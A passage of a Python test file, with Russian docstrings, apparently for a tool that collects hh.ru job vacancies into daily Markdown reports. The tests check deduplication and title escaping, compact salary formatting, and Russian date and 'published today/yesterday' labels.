    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("https://hh.ru/vacancy/1") == 1
    assert text.count("https://hh.ru/vacancy/2") == 1
    assert text.count("https://hh.ru/vacancy/3") == 1


def test_markdown_writes_no_empty_section_when_the_whole_batch_repeats(tmp_path: Path) -> None:
    """Иначе вечерний прогон дописывал бы «# Новые вакансии» с пустыми
    разделами: отчёт читают глазами, и такой хвост — это шум."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1")], NOW)
    before = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    sink.emit([make_scored(vacancy_id="1")], NOW.replace(hour=18))
    assert (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8") == before


def test_markdown_dedup_is_not_fooled_by_a_link_from_the_employer(tmp_path: Path) -> None:
    """Ссылку в отчёт может вписать работодатель — заголовком вида
    `Инженер](https://hh.ru/vacancy/2)`. Экранирование делает её текстом, и
    дедупликация обязана считать его текстом тоже, иначе чужой заголовок
    прячет настоящую вакансию из следующего отчёта."""
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Инженер](https://hh.ru/vacancy/2)")], NOW)
    sink.emit([make_scored(vacancy_id="2", title="Настоящая вторая")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert "Настоящая вторая" in text


def test_markdown_dedup_survives_a_title_ending_with_a_backslash(tmp_path: Path) -> None:
    """Обратный слэш в конце заголовка не должен прятать СВОЮ ссылку.

    `_escape` удваивает его, и перед закрывающей скобкой нашей ссылки
    оказывается `\\`: одиночный lookbehind `(?<!\\)` принял бы её за
    экранированную работодателем, дедупликация потеряла бы id, и
    следующий прогон вписал бы вакансию второй раз. Поэтому слэши
    считаются парами — экранирован лишь тот `]`, перед которым их
    нечётное число.
    """
    sink = MarkdownSink(tmp_path, threshold=60.0)
    sink.emit([make_scored(vacancy_id="1", title="Инженер C++ \\")], NOW)
    sink.emit([make_scored(vacancy_id="1", title="Инженер C++ \\")], NOW)
    text = (tmp_path / "2026-07-27-new.md").read_text(encoding="utf-8")
    assert text.count("https://hh.ru/vacancy/1") == 1


def test_short_salary_prints_a_range_in_thousands() -> None:
    """Диапазон — «450–600k ₽»: суффикс один раз в конце, тире короткое."""
    salary = Salary(
        raw="от 450 000 до 600 000 ₽", amount_from=450000, amount_to=600000, currency="₽"
    )
    assert format_salary_short(salary) == "450–600k ₽"


def test_short_salary_drops_the_remainder_instead_of_rounding_it_up() -> None:
    """487 500 даёт «от 487k», а не «от 488k».

    Округление вниз всегда в сторону скромности: «от 488k» обещало бы
    больше, чем написал работодатель, и обнаружилось бы это на собеседовании.
    """
    salary = Salary(raw="от 487 500 ₽", amount_from=487500, amount_to=None, currency="₽")
    assert format_salary_short(salary) == "от 487k ₽"


def test_short_salary_prints_only_the_upper_bound_when_there_is_no_lower() -> None:
    salary = Salary(raw="до 600 000 ₽", amount_from=None, amount_to=600000, currency="₽")
    assert format_salary_short(salary) == "до 600k ₽"


def test_short_salary_keeps_small_amounts_whole() -> None:
    """900 не превращается в «0k»: суффикс ставится, только если ОБЕ
    печатаемые суммы не меньше тысячи."""
    salary = Salary(raw="от 900 $", amount_from=900, amount_to=None, currency="$")
    assert format_salary_short(salary) == "от 900 $"


def test_short_salary_separates_thousands_with_a_space_when_it_prints_them_whole() -> None:
    salary = Salary(raw="от 900 до 5 000 ₽", amount_from=900, amount_to=5000, currency="₽")
    assert format_salary_short(salary) == "900–5 000 ₽"


def test_short_salary_without_currency_prints_the_amounts_alone() -> None:
    """Валюта не разобралась — суммы всё равно осмысленны."""
    salary = Salary(raw="от 450 000", amount_from=450000, amount_to=None, currency=None)
    assert format_salary_short(salary) == "от 450k"


def test_short_salary_is_none_when_no_amount_was_parsed() -> None:
    """`None`, а не «зарплата не указана»: вызывающий опускает часть
    мета-строки целиком вместе с разделителем."""
    assert format_salary_short(Salary()) is None
    assert format_salary_short(Salary(raw="по договорённости")) is None


def test_format_day_prints_the_russian_month_in_genitive() -> None:
    """Не `strftime("%B")`: в образе локали нет, и он дал бы «July»."""
    assert format_day(datetime(2026, 7, 30, tzinfo=UTC)) == "30 июля"
    assert format_day(datetime(2026, 1, 1, tzinfo=UTC)) == "1 января"
    assert format_day(datetime(2026, 12, 31, tzinfo=UTC)) == "31 декабря"


def test_published_today_and_yesterday_are_named_by_words() -> None:
    now = datetime(2026, 7, 30, 10, 0, tzinfo=UTC)
    assert format_published(datetime(2026, 7, 30, 9, 0, tzinfo=UTC), now) == "опубликовано сегодня"
    assert format_published(datetime(2026, 7, 29, 23, 0, tzinfo=UTC), now) == "опубликовано вчера"


def test_older_publication_is_named_by_the_date() -> None:
    now = datetime(2026, 7, 30, 10, 0, tzinfo=UTC)
    assert format_published(datetime(2026, 7, 28, 9, 0, tzinfo=UTC), now) == "опубликовано 28 июля"


def test_publication_day_is_counted_in_the_zone_of_now() -> None:
    """Сутки считаются в зоне `now` — той же, в которой именуется файл дня.

    Вакансия, вышедшая в 01:00 МСК 30-го, по UTC вышла 29-го и назовётся
    вчерашней. Цена названа в спеке: вторая шкала суток в одном сообщении
    поставила бы «Отчёт за 2026-07-30» рядом с «опубликовано сегодня» про
    разные сутки.
    """
    moscow = timezone(timedelta(hours=3))
    now = datetime(2026, 7, 30, 5, 0, tzinfo=UTC)
    published = datetime(2026, 7, 30, 1, 0, tzinfo=moscow)
    assert format_published(published, now) == "опубликовано вчера"


def test_naive_publication_date_is_dropped_instead_of_guessed() -> None:
    """Смещение hh.ru отдаёт (замер 2026-07-27, фикстура vacancy.html.gz:
    "datePosted": "2026-07-27T09:21:20.933+03:00"). Ветка нужна на случай
    смены формата: пропасть обязана одна строка, а не отправка целиком.
    """
    now = datetime(2026, 7, 30, 10, 0, tzinfo=UTC)
    assert format_published(datetime(2026, 7, 30, 9, 0), now) is None


def test_missing_publication_date_is_dropped() -> None:
    now = datetime(2026, 7, 30, 10, 0, tzinfo=UTC)
    assert format_published(None, now) is None
